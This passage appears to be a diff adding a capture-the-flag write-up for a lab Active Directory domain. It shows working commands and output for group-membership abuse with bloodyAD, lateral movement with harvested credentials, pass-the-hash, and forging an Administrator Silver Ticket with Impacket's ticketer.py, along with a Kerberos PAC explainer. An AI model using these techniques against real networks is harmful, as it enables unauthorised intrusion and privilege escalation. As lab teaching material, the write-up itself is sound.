+<p>With this computer account added, we can now use <code class="language-plaintext highlighter-rouge">jolene.ong</code> to add <code class="language-plaintext highlighter-rouge">gatari$</code> to the <code class="language-plaintext highlighter-rouge">senior-developers</code> group. The <a href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a> tool can be used for this purpose:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ bloodyAD --host 'dc01.antennae.rv' -u 'jolene.ong' -p 'BoXALrqvqPd3' add groupMember 'senior-developers' 'gatari$'
+[+] gatari$ added to senior-developers
+</code></pre></div></div>
+
+<p>With this done, we can now authenticate to the <code class="language-plaintext highlighter-rouge">SSH</code> service on <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code> using the <code class="language-plaintext highlighter-rouge">gatari$</code> computer account:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ssh sql01.antennae.rv -u 'gatari$' -p 'P@ssw0rd'  
+SSH         10.5.10.11      22     sql01.antennae.rv [*] SSH-2.0-OpenSSH_for_Windows_9.8 Win32-OpenSSH-GitHub
+SSH         10.5.10.11      22     sql01.antennae.rv [+] gatari$:P@ssw0rd  Windows - Shell access!
+</code></pre></div></div>
+
+<p>Do note that <code class="language-plaintext highlighter-rouge">WinRM</code> or <code class="language-plaintext highlighter-rouge">RDP</code> could have also been used instead of <code class="language-plaintext highlighter-rouge">SSH</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc winrm sql01.antennae.rv -u 'gatari$' -p 'P@ssw0rd'
+WINRM       10.5.10.11      5985   SQL01            [*] Windows Server 2022 Build 20348 (name:SQL01) (domain:antennae.rv) 
+WINRM       10.5.10.11      5985   SQL01            [+] antennae.rv\gatari$:P@ssw0rd (Pwn3d!)
+
+~$ nxc rdp sql01.antennae.rv -u 'gatari$' -p 'P@ssw0rd'  
+RDP         10.5.10.11      3389   SQL01            [*] Windows 10 or Windows Server 2016 Build 20348 (name:SQL01) (domain:antennae.rv) (nla:True)
+RDP         10.5.10.11      3389   SQL01            [+] antennae.rv\gatari$:P@ssw0rd 
+</code></pre></div></div>
+
+<p>We can now connect to the <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code> machine and read the <code class="language-plaintext highlighter-rouge">flag2.txt</code> file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ sshpass -p 'P@ssw0rd' ssh 'gatari$'@sql01.antennae.rv
+
+PS C:\&gt; cat flag2.txt
+RV{d@ngER0US_4cc3$S_C0n7Rol_1!sts!_6daa59eff6fd00657e9fb802c0078a4c}
+</code></pre></div></div>
+
+<h1 id="flag-3-moving-laterally">Flag 3: Moving Laterally</h1>
+
+<p><img src="/assets/img/rv-sept/3.png" alt="" /></p>
+
+<p>After obtaining local access to <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code>, we can begin enumerating the machine for any interesting files or credentials. After some searching (or running <code class="language-plaintext highlighter-rouge">tree /f /a</code>), we’ll find a file at <code class="language-plaintext highlighter-rouge">C:\Users\Public\test.ps1</code> that contains credentials for <code class="language-plaintext highlighter-rouge">wei.jie.tan</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users&gt; cat C:\Users\Public\test.ps1
+$username = 'wei.jie.tan'
+$password = 'klDCzcAiLGc2'
+$securePass = ConvertTo-SecureString $password -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential($username, $securePass)
+$scriptBlock = {
+    $targetFile = 'C:\temp.txt'
+    $timestamp  = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
+    "test =&gt; $timestamp" |
+        Out-File -FilePath $targetFile -Encoding UTF8 -Append
+}
+
+Start-Process -FilePath pwsh -ArgumentList '-NoProfile','-Command',(
+    [ScriptBlock]::Create($scriptBlock.ToString())
+) -Credential $creds -Wait -WindowStyle Hidden
+</code></pre></div></div>
+
+<p>In <code class="language-plaintext highlighter-rouge">BloodHound</code>, we’ll see that <code class="language-plaintext highlighter-rouge">wei.jie.tan</code> is also a member of the <code class="language-plaintext highlighter-rouge">senior-developers</code> group - which means that we can use this user to <code class="language-plaintext highlighter-rouge">SSH</code> into <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code> as well.</p>
+
+<p><img src="/assets/img/rv-sept/wjt.png" alt="" /></p>
+
+<p>We can use these credentials to authenticate to the <code class="language-plaintext highlighter-rouge">SSH</code> service on <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code>, and grab the <code class="language-plaintext highlighter-rouge">flag3.txt</code> file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ sshpass -p 'klDCzcAiLGc2' ssh 'wei.jie.tan'@sql01.antennae.rv
+
+PS C:\Users\wei.jie.tan\Desktop&gt; cat flag3.txt
+RV{lA7ERAl_m0vemenT_I5_a1SO_cOoL_3c69d6d47771c7d7671a5bf3c058e326}
+</code></pre></div></div>
+
+<h1 id="flag-4-historical-scar">Flag 4: Historical Scar</h1>
+
+<p><img src="/assets/img/rv-sept/4.png" alt="" /></p>
+
+<p>After obtaining access to <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code>, as <code class="language-plaintext highlighter-rouge">wei.jie.tan</code>, we can find the path to the user’s PowerShell history file by running the following command.</p>
+
+<blockquote>
+  <p><a href="https://stackoverflow.com/questions/44104043/how-can-i-see-the-command-history-across-all-powershell-sessions-in-windows-serv">https://stackoverflow.com/questions/44104043/how-can-i-see-the-command-history-across-all-powershell-sessions-in-windows-serv</a></p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\wei.jie.tan\Desktop&gt; (Get-PSReadlineOption).HistorySavePath
+C:\Users\wei.jie.tan\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+</code></pre></div></div>
+
+<p>This file will contain a history of all the PowerShell commands that <code class="language-plaintext highlighter-rouge">wei.jie.tan</code> has executed. By examining this file, we can find the credentials of <code class="language-plaintext highlighter-rouge">svc_sql</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\wei.jie.tan\Desktop&gt; cat (Get-PSReadlineOption).HistorySavePath
+whoami
+cd c:\SQL
+sqlcmd -S localhost -Q "SELECT @@VERSION" -b
+RV{AUd!T1ng_pS_CAn_8e_d@N6eROUs_e29abbb4bda372844a294da95c0c9218}
+sqlcmd -S localhost -U "svc_sql" -P "P@ssw0rd_f0r_SQL-antennae" -Q "SELECT @@VERSION;"
+sqlcmd -S localhost -U "svc_sql" -P "P@ssw0rd_f0r_SQL-antennae" -Q "EXEC sp_helpdb;"
+Get-Content (Get-PSReadlineOption).HistorySavePath
+exit
+cd Desktop
+ls
+cat flag3.txt
+cat (Get-PSReadlineOption).HistorySavePath
+(Get-PSReadlineOption).HistorySavePath
+cat (Get-PSReadlineOption).HistorySavePath
+</code></pre></div></div>
+
+<p>Additionally, we can also find the 4th flag in this file.</p>
+
+<h1 id="flag-5-silver">Flag 5: Silver</h1>
+
+<p><img src="/assets/img/rv-sept/5.png" alt="" /></p>
+
+<p>This flag was (as intended) found to be the most challenging, with only 3 participants solving it during the meetup. There are also a few different ways to solve this challenge, and we’ll be covering all of them here.</p>
+
+<h2 id="path-1-silver-ticket">Path 1: Silver Ticket</h2>
+
+<p>Earlier, we found that the <code class="language-plaintext highlighter-rouge">svc_sql</code> user possess the following SPN: <code class="language-plaintext highlighter-rouge">MSSQLSvc/sql01.antennae.rv</code>. This means that the user provisions the <code class="language-plaintext highlighter-rouge">MSSQL</code> service on <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code>.</p>
+
+<p>For the sake of demonstration, we can connect to the <code class="language-plaintext highlighter-rouge">MSSQL</code> service on <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code> using any domain user - for example <code class="language-plaintext highlighter-rouge">chloe.lim</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc mssql sql01.antennae.rv -u 'chloe.lim' -p 'BZCJsopuOPgH'            
+MSSQL       10.5.10.11      1433   SQL01            [*] Windows Server 2022 Build 20348 (name:SQL01) (domain:antennae.rv)
+MSSQL       10.5.10.11      1433   SQL01            [+] antennae.rv\chloe.lim:BZCJsopuOPgH 
+</code></pre></div></div>
+
+<p>We can also use <code class="language-plaintext highlighter-rouge">mssqlclient.py</code> from <a href="https://github.com/fortra/impacket">Impacket</a> to connect to the <code class="language-plaintext highlighter-rouge">MSSQL</code> service:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ mssqlclient.py 'chloe.lim':'BZCJsopuOPgH'@sql01.antennae.rv -windows-auth
+Impacket v0.13.0.dev0+20250813.95021.3e63dae - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(SQL01): Line 1: Changed database context to 'master'.
+[*] INFO(SQL01): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
+[!] Press help for extra shell commands
+SQL (antennae\chloe.lim  guest@master)&gt; 
+</code></pre></div></div>
+
+<p>The following parts will do an unnecessarily deep-dive into <code class="language-plaintext highlighter-rouge">Kerberos</code>, if you’re already familiar with it or simply don’t care, feel free to skip ahead to <a href="#forging-tickets">#forging-tickets</a></p>
+
+<h3 id="understanding-kerberos">Understanding Kerberos</h3>
+
+<p>This portion is going to be a mini-deep-dive into how Kerberos works, since I realized that of the 3 participants who solved this challenge, none of them actually understood how it worked. Additionally, this knowledge is useful for understanding Kerberos in general, and can be applied to other scenarios as well.</p>
+
+<p>Earlier we demonstrated connecting to the <code class="language-plaintext highlighter-rouge">MSSQL</code> service using <code class="language-plaintext highlighter-rouge">chloe.lim</code>’s credentials. By default, <a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/ntlm-user-authentication"><code class="language-plaintext highlighter-rouge">NTLM</code></a> authentication is used. This can be seen from the source code of <code class="language-plaintext highlighter-rouge">mssqlclient.py</code>:</p>
+
+<blockquote>
+  <p>See <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/801a4681-8809-4be9-ab0d-61dcfe762786">NTLMSSP_CHALLENGE</a> for more details on the <code class="language-plaintext highlighter-rouge">NTLMSSP_CHALLENGE</code> structure. Additionally, I heavily recommend that you read <a href="https://ericesquivel.github.io/posts/kerberos">this</a> blog post to have a fundamental understanding of Kerberos.</p>
+</blockquote>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># https://github.com/fortra/impacket/blob/master/impacket/tds.py#L993
+</span><span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">database</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s">''</span><span class="p">,</span> <span class="n">domain</span><span class="o">=</span><span class="s">''</span><span class="p">,</span> <span class="n">hashes</span> <span class="o">=</span> <span class="bp">None</span><span class="p">,</span> <span class="n">useWindowsAuth</span> <span class="o">=</span> <span class="bp">False</span><span class="p">):</span>
+  <span class="p">[...</span><span class="n">snip</span><span class="p">...]</span>
+  <span class="k">if</span> <span class="n">useWindowsAuth</span> <span class="ow">is</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">login</span><span class="p">[</span><span class="s">'OptionFlags2'</span><span class="p">]</span> <span class="o">|=</span> <span class="n">TDS_INTEGRATED_SECURITY_ON</span>
+    <span class="n">auth</span> <span class="o">=</span> <span class="n">ntlm</span><span class="p">.</span><span class="n">getNTLMSSPType1</span><span class="p">(</span><span class="s">''</span><span class="p">,</span> <span class="s">''</span><span class="p">,</span> <span class="n">use_ntlmv2</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">version</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">version</span><span class="p">)</span>
+    <span class="n">login</span><span class="p">[</span><span class="s">'SSPI'</span><span class="p">]</span> <span class="o">=</span> <span class="n">auth</span><span class="p">.</span><span class="n">getData</span><span class="p">()</span>
+  
+  <span class="k">if</span> <span class="n">useWindowsAuth</span> <span class="ow">is</span> <span class="bp">True</span><span class="p">:</span>
+      <span class="c1"># Each TDS packet has a header so we extract the NTLMSSP_CHALLENGE from it
+</span>      <span class="n">serverChallenge</span> <span class="o">=</span> <span class="n">tds</span><span class="p">[</span><span class="s">'Data'</span><span class="p">][</span><span class="mi">3</span><span class="p">:]</span>
+
+<span class="c1"># https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/801a4681-8809-4be9-ab0d-61dcfe762786
+</span></code></pre></div></div>
+
+<p>However, we can force the use of the <code class="language-plaintext highlighter-rouge">Kerberos</code> authentication protocol instead of <code class="language-plaintext highlighter-rouge">NTLM</code> by providing the <code class="language-plaintext highlighter-rouge">-k</code> flag to <code class="language-plaintext highlighter-rouge">mssqlclient.py</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ mssqlclient.py 'antennae.rv'/'chloe.lim':'BZCJsopuOPgH'@SQL01.antennae.rv -k        
+Impacket v0.13.0.dev0+20250813.95021.3e63dae - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[-] CCache file is not found. Skipping...
+[-] CCache file is not found. Skipping...
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(SQL01): Line 1: Changed database context to 'master'.
+[*] INFO(SQL01): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
+[!] Press help for extra shell commands
+SQL (antennae\chloe.lim  guest@master)&gt; 
+</code></pre></div></div>
+
+<p>While performing this authentication, we can inspect the network traffic and find the corresponding <code class="language-plaintext highlighter-rouge">TGS-REQ</code> and <code class="language-plaintext highlighter-rouge">TGS-REP</code> packets. These are part of the <code class="language-plaintext highlighter-rouge">TGS</code> exchange in the <code class="language-plaintext highlighter-rouge">Kerberos</code> protocol, where the client (us!) requests for a service ticket to access a specific service (in this case, the <code class="language-plaintext highlighter-rouge">MSSQL</code> service on <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code>).</p>
+
+<p><img src="/assets/img/rv-sept/tgs.png" alt="" /></p>
+
+<p>In the <code class="language-plaintext highlighter-rouge">TGS-REQ</code> packet, we find that we are requesting a service ticket for the <code class="language-plaintext highlighter-rouge">MSSQLSvc/sql01.antennae.rv</code> SPN:</p>
+
+<p><img src="/assets/img/rv-sept/tgsreq.png" alt="" /></p>
+
+<blockquote>
+  <p>For a detailed explanation on the <code class="language-plaintext highlighter-rouge">sname-string</code> structure, and how it is parsed into the <code class="language-plaintext highlighter-rouge">MSSQLSvc/sql01.antennae.rv</code> SPN, please refer to <a href="https://github.com/ASYNC-Security/W200-Preview-Public?tab=readme-ov-file#service-principal-name-who">our public preview</a> which navigates the <a href="https://datatracker.ietf.org/doc/html/rfc4120#section-5.4.1">RFC 4120, Section 5.4.1</a> - <code class="language-plaintext highlighter-rouge">KDC-REQ</code> and <code class="language-plaintext highlighter-rouge">KDC-REQ-BODY</code> structures.</p>
+</blockquote>
+
+<p>As you’d expect, the <code class="language-plaintext highlighter-rouge">TGS-REP</code> packet contains the encrypted service ticket that we requested:</p>
+
+<p><img src="/assets/img/rv-sept/tgsrep.png" alt="" /></p>
+
+<p>As per <a href="https://datatracker.ietf.org/doc/html/rfc4120#section-5.3">RFC 4120, Section 5.3</a>, the <code class="language-plaintext highlighter-rouge">ticket</code> structure returned in the <code class="language-plaintext highlighter-rouge">KDC-REP</code> message is defined as follows:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Ticket          ::= [APPLICATION 1] SEQUENCE {
+        tkt-vno         [0] INTEGER (5),
+        realm           [1] Realm,
+        sname           [2] PrincipalName,
+        enc-part        [3] EncryptedData -- EncTicketPart
+}
+</code></pre></div></div>
+
+<p>Where the <code class="language-plaintext highlighter-rouge">enc-part</code> contains an <code class="language-plaintext highlighter-rouge">EncryptedData</code> structure, given by <a href="https://datatracker.ietf.org/doc/html/rfc4120#appendix-A">RFC 4120, Appendix A - ASN.1</a>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EncryptedData   ::= SEQUENCE {
+        etype   [0] Int32 -- EncryptionType --,
+        kvno    [1] UInt32 OPTIONAL,
+        cipher  [2] OCTET STRING -- ciphertext
+}
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">cipher</code> field contains the actual information about the authenticating client, encrypted with the service account’s password - in this case, that service account is <code class="language-plaintext highlighter-rouge">svc_sql</code>. This encrypted portion of the ticket contains information about the client (us!), in a proprietary format known as the <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/166d8064-c863-41e1-9c23-edaaa5f36962">MS-PAC</a> structure.</p>
+
+<blockquote>
+  <p>Since this part is encrypted with the service account’s password, the user cannot tamper with it! This is the base of the security of the <code class="language-plaintext highlighter-rouge">Kerberos</code> protocol, where services “trust” the <code class="language-plaintext highlighter-rouge">KDC</code> to issue valid tickets.</p>
+</blockquote>
+
+<p>The <code class="language-plaintext highlighter-rouge">MS-PAC</code> (referred to as <code class="language-plaintext highlighter-rouge">PAC</code> from hereon) structure contains a lot of information about the client that the service will simply trust, and use to authorize the client. You can think of this structure as a glorified <a href="https://www.geeksforgeeks.org/web-tech/json-web-token-jwt/">JWT</a> token.</p>
+
+<h3 id="fetching-the-pac">Fetching the PAC</h3>
+
+<p>Since we have the credentials of <code class="language-plaintext highlighter-rouge">svc_sql</code>, we can decrypt the <code class="language-plaintext highlighter-rouge">ticket-&gt;enc-part-&gt;cipher</code> field, and extract the <code class="language-plaintext highlighter-rouge">PAC</code> structure. This can be done using <a href="https://github.com/fortra/impacket">Impacket</a>, which conveniently exposes an interface to parse a <code class="language-plaintext highlighter-rouge">MS-PAC</code> structure in <a href="https://github.com/fortra/impacket/blob/master/impacket/krb5/pac.py">pac.py</a>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">try</span><span class="p">:</span>
+  <span class="n">cipherText</span> <span class="o">=</span> <span class="n">decodedTicket</span><span class="p">[</span><span class="s">'ticket'</span><span class="p">][</span><span class="s">'enc-part'</span><span class="p">][</span><span class="s">'cipher'</span><span class="p">]</span>
+  <span class="n">newCipher</span> <span class="o">=</span> <span class="n">_enctype_table</span><span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">etype</span><span class="p">)]</span>
+  <span class="n">plainText</span> <span class="o">=</span> <span class="n">newCipher</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">cipherText</span><span class="p">)</span>
+  <span class="p">[...</span><span class="n">snip</span><span class="p">...]</span>
+  <span class="n">encTicketPart</span> <span class="o">=</span> <span class="n">decoder</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="n">plainText</span><span class="p">,</span> <span class="n">asn1Spec</span><span class="o">=</span><span class="n">EncTicketPart</span><span class="p">())[</span><span class="mi">0</span><span class="p">]</span>
+  <span class="n">sessionKey</span> <span class="o">=</span> <span class="n">Key</span><span class="p">(</span><span class="n">encTicketPart</span><span class="p">[</span><span class="s">'key'</span><span class="p">][</span><span class="s">'keytype'</span><span class="p">],</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">encTicketPart</span><span class="p">[</span><span class="s">'key'</span><span class="p">][</span><span class="s">'keyvalue'</span><span class="p">]))</span>
+  <span class="n">adIfRelevant</span> <span class="o">=</span> <span class="n">decoder</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="n">encTicketPart</span><span class="p">[</span><span class="s">'authorization-data'</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s">'ad-data'</span><span class="p">],</span> <span class="n">asn1Spec</span><span class="o">=</span><span class="n">AD_IF_RELEVANT</span><span class="p">())[</span><span class="mi">0</span><span class="p">]</span>
+  <span class="c1"># parsing every PAC
+</span>  <span class="n">parsed_pac</span> <span class="o">=</span> <span class="n">parse_pac</span><span class="p">(</span><span class="n">pacType</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span>
+  <span class="n">logging</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"%-30s:"</span> <span class="o">%</span> <span class="s">"Decoding credential[%d]['ticket']['enc-part']"</span> <span class="o">%</span> <span class="n">cred_number</span><span class="p">)</span>
+  <span class="c1"># One section per PAC
+</span>  <span class="k">for</span> <span class="n">element_type</span> <span class="ow">in</span> <span class="n">parsed_pac</span><span class="p">:</span>
+          <span class="n">element_type_name</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">element_type</span><span class="p">.</span><span class="n">keys</span><span class="p">())[</span><span class="mi">0</span><span class="p">]</span>
+          <span class="n">logging</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"  %-28s"</span> <span class="o">%</span> <span class="n">element_type_name</span><span class="p">)</span>
+  
+  <span class="c1"># ... do stuff with the pac info...
+</span></code></pre></div></div>
+
+<p><a href="https://github.com/fortra/impacket/blob/master/examples/describeTicket.py">describeTicket.py</a> uses this interface to decrypt the <code class="language-plaintext highlighter-rouge">ticket-&gt;enc-part-&gt;cipher</code> field, and parse the <code class="language-plaintext highlighter-rouge">PAC</code> structure given the service account’s <code class="language-plaintext highlighter-rouge">NTLM</code> hash. Firstly, we can convert the plaintext password of <code class="language-plaintext highlighter-rouge">svc_sql</code> to its corresponding <code class="language-plaintext highlighter-rouge">NTLM</code> hash easily with some python:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ python3        
+
+Python 3.13.5 (main, Jun 25 2025, 18:55:22) [GCC 14.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+&gt;&gt;&gt; import hashlib
+&gt;&gt;&gt; import binascii
+&gt;&gt;&gt; pw = "P@ssw0rd_f0r_SQL-antennae"
+&gt;&gt;&gt; binascii.hexlify(hashlib.new('md4', pw.encode('utf-16le')).digest()).decode()
+
+'dafede3a0d35ddb28147bd418e4cd53b'
+</code></pre></div></div>
+
+<p>We can verify that this is indeed the correct <code class="language-plaintext highlighter-rouge">NTLM</code> hash by using it to authenticate to the domain controller using <a href="https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/pass-the-hash-attack/">pass-the-hash</a>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc01.antennae.rv -u 'svc_sql' -H 'dafede3a0d35ddb28147bd418e4cd53b'
+LDAP        10.5.10.10      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:antennae.rv) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.5.10.10      389    DC01             [+] antennae.rv\svc_sql:dafede3a0d35ddb28147bd418e4cd53b 
+</code></pre></div></div>
+
+<p>Next, we can request for a service ticket for the <code class="language-plaintext highlighter-rouge">MSSQLSvc/sql01.antennae.rv</code> SPN using <code class="language-plaintext highlighter-rouge">kvno</code> like we did in <a href="#roasting-the-hard-way">#roasting-the-hard-way</a>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ echo 'BZCJsopuOPgH' | kinit 'chloe.lim'@ANTENNAE.RV
+Password for chloe.lim@ANTENNAE.RV: 
+
+~$ kvno 'MSSQLSvc/sql01.antennae.rv'
+MSSQLSvc/sql01.antennae.rv@ANTENNAE.RV: kvno = 2
+
+~$ klist                            
+Ticket cache: FILE:/tmp/krb5cc_1000
+Default principal: chloe.lim@ANTENNAE.RV
+
+Valid starting       Expires              Service principal
+09/07/2025 11:19:28  09/07/2025 21:19:28  krbtgt/ANTENNAE.RV@ANTENNAE.RV
+        renew until 09/08/2025 11:19:28
+09/07/2025 11:19:38  09/07/2025 21:19:28  MSSQLSvc/sql01.antennae.rv@ANTENNAE.RV
+        renew until 09/08/2025 11:19:28
+</code></pre></div></div>
+
+<blockquote>
+  <p>All Kerberos tickets are stored in <code class="language-plaintext highlighter-rouge">/tmp/krb5cc_$(id -u)</code> by default.</p>
+</blockquote>
+
+<p>We can now proceed with decrypting the service ticket, and parsing the <code class="language-plaintext highlighter-rouge">PAC</code> structure using <code class="language-plaintext highlighter-rouge">describeTicket.py</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ describeTicket.py /tmp/krb5cc_1000 --rc4 'dafede3a0d35ddb28147bd418e4cd53b'
+Impacket v0.13.0.dev0+20250813.95021.3e63dae - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Number of credentials in cache: 2
+
+[...snip...]
+
+[*]   LoginInfo                   
+[...snip...]
+[*]     Account Name              : chloe.lim
+[*]     Groups (decoded)          : (513) Domain Users
+[*]     User Flags                : (32) LOGON_EXTRA_SIDS
+[*]     User Session Key          : 00000000000000000000000000000000
+[*]     Logon Server              : DC01
+[*]     Logon Domain Name         : antennae
+[*]     Logon Domain SID          : S-1-5-21-1843653573-2831615454-1469364877
+[*]     User Account Control      : (16) USER_NORMAL_ACCOUNT
+[*]     Extra SID Count           : 1
+[*]     Extra SIDs                : S-1-18-1 Authentication authority asserted identity (SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED)
+[*]     Resource Group Domain SID :
+[*]     Resource Group Count      : 0
+[*]     Resource Group Ids        : 
+[*]     LMKey                     : 0000000000000000
+[*]     SubAuthStatus             : 0
+[*]     Reserved3                 : 0
+</code></pre></div></div>
+
+<p>For brevity, I’ve snipped out all of the other PAC sections, except for the <a href="https://learn.microsoft.com/en-us/previous-versions/aa302203(v=msdn.10)?redirectedfrom=MSDN#pac-credential-information-pac_logon_info">PAC_LOGON_INFO</a> structure which contains: <code class="language-plaintext highlighter-rouge">the credential information for the client of the Kerberos ticket.</code>.</p>
+
+<h3 id="forging-tickets">Forging Tickets</h3>
+
+<p>Since we have the credentials of <code class="language-plaintext highlighter-rouge">svc_sql</code>, we were able to decrypt a service ticket issued to <code class="language-plaintext highlighter-rouge">chloe.lim</code> and parse the <code class="language-plaintext highlighter-rouge">PAC</code> structure. With this knowledge, we can reverse the process and artificially forge a <code class="language-plaintext highlighter-rouge">PAC</code> structure for any user we want, encrypt it with <code class="language-plaintext highlighter-rouge">svc_sql</code>’s password, and create a valid service ticket for that user. This is known as a <a href="https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/silver-ticket-attack/">Silver Ticket Attack</a>.</p>
+
+<p>With this forged ticket, we can access the <code class="language-plaintext highlighter-rouge">MSSQL</code> service on <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code> as any user we want - including privileged users, like <code class="language-plaintext highlighter-rouge">Administrator</code>. We can forge this ticket using <a href="https://github.com/fortra/impacket/blob/master/examples/ticketer.py">ticketer.py</a>. The following information is required to forge a ticket, most of which can be grabbed from <code class="language-plaintext highlighter-rouge">BloodHound</code>:</p>
+
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">-spn</code>: The SPN of the service we want to access. In this case, it’s <code class="language-plaintext highlighter-rouge">MSSQLSvc/sql01.antennae.rv</code>.</li>
+  <li><code class="language-plaintext highlighter-rouge">-domain</code>: The domain name, which is <code class="language-plaintext highlighter-rouge">antennae.rv</code>.</li>
+  <li><code class="language-plaintext highlighter-rouge">-domain-sid</code>: The domain SID, which can be found in <code class="language-plaintext highlighter-rouge">BloodHound</code> or by running <code class="language-plaintext highlighter-rouge">whoami /user</code> on any domain-joined machine. In this case, it’s <code class="language-plaintext highlighter-rouge">S-1-5-21-1843653573-2831615454-1469364877</code>.</li>
+  <li><code class="language-plaintext highlighter-rouge">-nthash</code>: The <code class="language-plaintext highlighter-rouge">NTLM</code> hash of the service account, which we have already computed to be <code class="language-plaintext highlighter-rouge">dafede3a0d35ddb28147bd418e4cd53b</code>.</li>
+</ol>
+
+<p>With this information, we can forge a ticket for the <code class="language-plaintext highlighter-rouge">Administrator</code> user:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ ticketer.py -spn 'MSSQLSvc/sql01.antennae.rv' -domain 'antennae.rv' -domain-sid 'S-1-5-21-1843653573-2831615454-1469364877' -nthash 'dafede3a0d35ddb28147bd418e4cd53b' Administrator               
+Impacket v0.13.0.dev0+20250813.95021.3e63dae - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for antennae.rv/Administrator
+[*]     PAC_LOGON_INFO
+[*]     PAC_CLIENT_INFO_TYPE
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*]     PAC_SERVER_CHECKSUM
+[*]     PAC_PRIVSVR_CHECKSUM
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Saving ticket in Administrator.ccache
+</code></pre></div></div>
+
